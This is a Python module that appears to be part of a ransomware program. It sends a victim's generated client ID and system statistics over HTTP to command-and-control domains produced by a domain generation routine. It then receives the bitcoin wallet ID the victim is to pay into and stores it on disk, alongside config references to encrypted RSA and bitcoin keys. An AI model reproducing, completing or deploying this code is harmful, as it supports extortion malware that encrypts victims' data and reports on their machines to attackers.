import logging
import requests
from core.utils.generators import generate_client_id
from core.utils.statistics import get_statistics
from core.utils.file_ops import write_data_to_file
from base64 import b64encode, b64decode
from core.comms.cnc_generator import generate_domains
from core.config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
)

logger = logging.getLogger(__name__)


def build_request():
    """Build the bitcoin address generation request body

    Returns:
        dict: The parameters required for bitcoin address generation request
    """    
    logger.info("Building initalisation Request")
    body = {
        "client_id": generate_client_id(),
        "statistics": get_statistics(),
    }
    return body


def send_request(server, body):
    """Send the request to the server and return the response 

    Args:
        server (str): The domain name of the server
        body (dict): The request parameters

    Returns:
        dict: The response parameters
    """    
    logger.info(f"Sending request to {server}")
    try:
        response = requests.post(url=f"http://{server.strip('/')}/initialise", json=body)
        if response.status_code // 100 == 2: 
            return response.json()
        else:
            logger.error(f"Some problem in server. Received {response.status_code}")
    except Exception as err:
        logger.error(err)


def get_bitcoin_wallet_address():
    """Driver function to generate bitcoin request by calling the server

    Returns:
        str: The wallet Id that the user needs to make payments to
    """    
    body = build_request()
    domains = generate_domains()
    for domain in domains:
        response = send_request(server=domain, body=body)
        if response and generate_client_id() == response.get("client_id"):
            logger.info("Wallet ID successfully received")
            write_data_to_file(BITCOIN_WALLET_ID_PATH, response.get("wallet_id").encode())
            return response.get("wallet_id")
    
    raise Exception()


